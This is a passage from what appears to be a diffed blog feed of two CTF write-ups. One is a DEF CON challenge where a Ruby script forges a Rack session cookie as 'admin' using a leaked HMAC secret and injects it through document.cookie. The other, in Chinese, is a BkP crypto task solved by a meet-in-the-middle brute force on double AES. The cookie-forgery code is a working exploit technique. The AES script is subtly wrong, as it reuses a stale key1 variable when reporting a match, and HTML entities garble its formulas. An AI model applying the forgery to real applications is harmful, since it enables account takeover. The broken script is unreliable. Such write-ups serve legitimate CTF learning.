+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;rack.session&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj</span><span class="se">\n</span><span class="s2">YjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki</span><span class="se">\n</span><span class="s2">DXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm</span><span class="se">\n</span><span class="s2">OWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND</span><span class="se">\n</span><span class="s2">RVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj</span><span class="se">\n</span><span class="s2">OGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0</span><span class="se">\n</span><span class="s2">YWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG</span><span class="se">\n</span><span class="s2">OwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx</span><span class="se">\n</span><span class="s2">YWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl</span><span class="se">\n</span><span class="s2">c3QGOwBU</span><span class="se">\n</span><span class="s2">--d637305e23d6693f3ebe276b292293c7ff0b72e6&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>we&rsquo;ve got some message:</p>
+
+<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable rack.session, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe <code>wroashsoxDiculReejLykUssyifabEdGhovHabno</code></p>
+
+<p>By seeking the source code of rack, we found this <a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/</a></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="vi">@secrets</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">values_at</span><span class="p">(</span><span class="ss">:secret</span><span class="p">,</span> <span class="ss">:_old_secret</span><span class="p">)</span><span class="o">.</span><span class="n">compact</span>
+</span><span class='line'><span class="c1"># some code else</span>
+</span><span class='line'><span class="n">session_data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span>
+</span><span class='line'>    <span class="n">session_data</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;--</span><span class="si">#{</span><span class="n">generate_hmac</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="c1"># some code else</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">session_data</span>
+</span><span class='line'>    <span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span> <span class="o">=</span> <span class="n">session_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;--&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">session_data</span> <span class="o">=</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">digest_match?</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Meanwhile, we knew the whole process of the session checking. thus, I&rsquo;ve wrote a ruby script to figure out this stuff with this way</p>
+
+<ul>
+<li><code>unpack(decode)</code> the cookie to origin session data</li>
+<li>modify session_data.user_name to <code>admin</code></li>
+<li><code>repack(encode)</code> the session data to cookie string format</li>
+<li>calculate a new digest of the session data then build the cookie</li>
+</ul>
+
+
+<h3>code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
+</span><span class='line'><span class="c1">#Author: xelz@blue-lotus</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># part of rack/lib/rack/session/cookie.rb</span>
+</span><span class='line'><span class="k">class</span> <span class="nc">Base64</span>
+</span><span class='line'>    <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>        <span class="o">[</span><span class="n">str</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">str</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># Encode session cookies as Marshaled Base64 data</span>
+</span><span class='line'>    <span class="k">class</span> <span class="nc">Marshal</span> <span class="o">&lt;</span> <span class="no">Base64</span>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">super</span><span class="p">(</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">str</span><span class="p">))</span>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">return</span> <span class="k">unless</span> <span class="n">str</span>
+</span><span class='line'>            <span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="k">super</span><span class="p">(</span><span class="n">str</span><span class="p">))</span> <span class="k">rescue</span> <span class="kp">nil</span>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">exit</span><span class="p">()</span> <span class="k">unless</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;--&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'><span class="c1"># puts &#39;data is:&#39;</span>
+</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">coder</span> <span class="o">=</span> <span class="no">Base64</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">new</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="n">data</span><span class="o">[</span><span class="s1">&#39;user_name&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="c1"># puts &#39;modified data is:&#39;</span>
+</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">secret</span> <span class="o">=</span> <span class="s1">&#39;wroashsoxDiculReejLykUssyifabEdGhovHabno&#39;</span>
+</span><span class='line'><span class="c1"># puts &#39;new digest string is:&#39;</span>
+</span><span class='line'><span class="n">digest</span> <span class="o">=</span> <span class="n">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+</span><span class='line'><span class="c1"># puts digest, &quot;\n&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;cookie is&#39;</span>
+</span><span class='line'><span class="n">cookie</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;%0A&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;--&#39;</span> <span class="o">+</span> <span class="n">digest</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cookie</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>run the script like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>xelz@blue-lotus:defconctf<span class="nv">$echo</span> -en <span class="s1">&#39;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1&quot;\\&quot;}&#39;</span> <span class="p">|</span> xargs ./hypeman.rb
+</span><span class='line'>cookie is
+</span><span class='line'>BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4<span class="o">=</span>%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&rsquo;d like to use the Javascript Console in Chrome:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;rack.session=xxx;&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>refresh the page, and enjoy :)</p>
+
+<h3>key</h3>
+
+<blockquote><p>watch out for this Etdeksogav</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[BkP-CTF 2013 MITM]]></title>
+    <link href="http://xelz.info/blog/2013/06/13/bkp-ctf-2013-mitm/"/>
+    <updated>2013-06-13T03:27:34+08:00</updated>
+    <id>http://xelz.info/blog/2013/06/13/bkp-ctf-2013-mitm</id>
+    <content type="html"><![CDATA[<p>前两天BkP的CTF练习赛中的一道题，crypto 200，题目如下</p>
+
+<blockquote><p>message 1: QUVTLTI1NiBFQ0IgbW9kZSB0d2ljZSwgdHdvIGtleXM=</p>
+
+<p>encrypted: THbpB4bE82Rq35khemTQ10ntxZ8sf7s2WK8ErwcdDEc=</p>
+
+<p>message 2: RWFjaCBrZXkgemVybyB1bnRpbCBsYXN0IDI0IGJpdHM=</p>
+
+<p>encrypted: 01YZbSrta2N+1pOeQppmPETzoT/Yqb816yGlyceuEOE=</p>
+
+<p>ciphertext: s5hd0ThTkv1U44r9aRyUhaX5qJe561MZ16071nlvM9U=</p></blockquote>
+
+<p>看到最后的等号首先就想到了base64编码，decode之后得到</p>
+
+<blockquote><p>message1: AES-256 ECB mode twice, two keys</p>
+
+<p>message2: Each key zero until last 24 bits</p>
+
+<p>两轮AES-256加密，padding=ECB，key不一样，但是前面都是0x00，只有最后24位需要破解</p>
+
+<p>密文都是2进制不可读，不贴了</p></blockquote>
+
+<p>题目提示了是256位(32字节的key)，前29个字节都是0，需要破解两个key的后3个字节，纯暴力方式需要尝试2<sup>24</sup> * 2<sup>24</sup> = 2<sup>48</sup> ≈ 2.81e14种可能，这么大的计算量，显然是不现实的。</p>
+
+<!-- more -->
+
+
+<p>暴力破解，估计要用到hadoop集群了。</p>
+
+<p>其实，当时忽略了一个细节，就是题目：MITM，google一下出来的都是Man-in-the-middle Attack（中间人攻击），似乎跟这个题目半毛钱关系都没有，换用wikipedia得到了我们想要的东西：</p>
+
+<ul>
+<li>Man-in-the-middle attack, a computer networking attack method</li>
+<li>Meet-in-the-middle attack, a cryptographic attack method</li>
+</ul>
+
+
+<p>很显然，Meet-in-the-middle attack应该就是我们想找的东西了</p>
+
+<blockquote><p>Assume the attacker knows a set of plaintext P and ciphertext C that satisfies the following:</p>
+
+<ul>
+<li>C=ENCk2(ENCk1(P))</li>
+<li>P=DECk1(DECk2&copy;</li>
+</ul>
+
+
+<p>where ENC is the encryption function, DEC the decryption function defined as ENC-1 (inverse mapping) and k1 and k2 are two keys.</p>
+
+<p>The attacker can then compute ENCk1(P) for all possible keys k1. Afterwards he can decrypt the ciphertext by computing DECk2&copy; for each k2. Any matches between these two resulting sets are likely to reveal the correct keys. (To speed up the comparison, the ENCk1(P) set can be stored in an in-memory lookup table, then each DECk2&copy; can be matched against the values in the lookup table to find the candidate keys)</p></blockquote>
+
+<p>这个模型跟题目所设的是完全一样的，思路给的很清楚了，先穷举key1，计算出明文经过所有可能的key1加密后的结果，将结果存于内存中，然后穷举key2，计算密文经过key2解密后的结果，与内存中的结果集进行比对（因为AES是对称加密，加密跟解密是用的相同的key），如果有一致的，就表明破解成功了，这样算起来，时间复杂度只有2<sup>24</sup> + 2<sup>24</sup> = 2<sup>25</sup></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'><span class="c">#! -*- coding: utf-8 -*-</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">aes_encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">ciphertext</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">aes_decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">plaintext</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">message1</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;QUVTLTI1NiBFQ0IgbW9kZSB0d2ljZSwgdHdvIGtleXM=&#39;</span><span class="p">)</span>     <span class="c"># &#39;AES-256 ECB mode twice, two keys&#39;</span>
+</span><span class='line'>    <span class="n">ciphertext1</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;THbpB4bE82Rq35khemTQ10ntxZ8sf7s2WK8ErwcdDEc=&#39;</span><span class="p">)</span>  <span class="c"># &#39;\x4c\x76\xe9\x07\x86\xc4\xf3\x64\x6a\xdf\x99\x21\x7a\x64\xd0\xd7\x49\xed\xc5\x9f\x2c\x7f\xbb\x36\x58\xaf\x04\xaf\x07\x1d\x0c\x47&#39;</span>
+</span><span class='line'>    <span class="c"># message2 = b64decode(&#39;RWFjaCBrZXkgemVybyB1bnRpbCBsYXN0IDI0IGJpdHM=&#39;)     # &#39;Each key zero until last 24 bits&#39;</span>
+</span><span class='line'>    <span class="c"># ciphertext2 = b64decode(&#39;01YZbSrta2N+1pOeQppmPETzoT/Yqb816yGlyceuEOE=&#39;)  # &#39;\xd3\x56\x19\x6d\x2a\xed\x6b\x63\x7e\xd6\x93\x9e\x42\x9a\x66\x3c\x44\xf3\xa1\x3f\xd8\xa9\xbf\x35\xeb\x21\xa5\xc9\xc7\xae\x10\xe1&#39;</span>
+</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;s5hd0ThTkv1U44r9aRyUhaX5qJe561MZ16071nlvM9U=&#39;</span><span class="p">)</span>   <span class="c"># &#39;\xb3\x98\x5d\xd1\x38\x53\x92\xfd\x54\xe3\x8a\xfd\x69\x1c\x94\x85\xa5\xf9\xa8\x97\xb9\xeb\x53\x19\xd7\xad\x3b\xd6\x79\x6f\x33\xd5&#39;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">prefix</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span> <span class="o">*</span> <span class="mi">29</span>
+</span><span class='line'>    <span class="n">clist</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">mitms</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">key1</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">mitm1</span> <span class="o">=</span> <span class="n">aes_encrypt</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">message1</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">mitms</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mitm1</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">mitms_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">mitms</span><span class="p">)</span>  <span class="c"># convert to set for faster index</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">key2</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">anmitm1</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">ciphertext1</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">anmitm1</span> <span class="ow">in</span> <span class="n">mitms_set</span><span class="p">:</span>
+</span><span class='line'>                    <span class="n">key1_suffix</span> <span class="o">=</span> <span class="n">mitms</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">anmitm1</span><span class="p">)</span>
+</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;key1: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">key1</span><span class="p">)</span>
+</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;key2: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">key2</span><span class="p">)</span>
+</span><span class='line'>                    <span class="n">msg</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">))</span>
+</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;message is: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">msg</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>大概5分钟左右就跑完了，缓存key1的加密结果用了1.65G内存，如果内存不够，可以对key1分段跑，不过时间就要相应变长。</p>
+
+<p>key1:</p>
+
+<blockquote><p>\x9a\xe8\x07</p></blockquote>
+
+<p>key2:</p>
+
+<blockquote><p>\xff?E</p></blockquote>
+
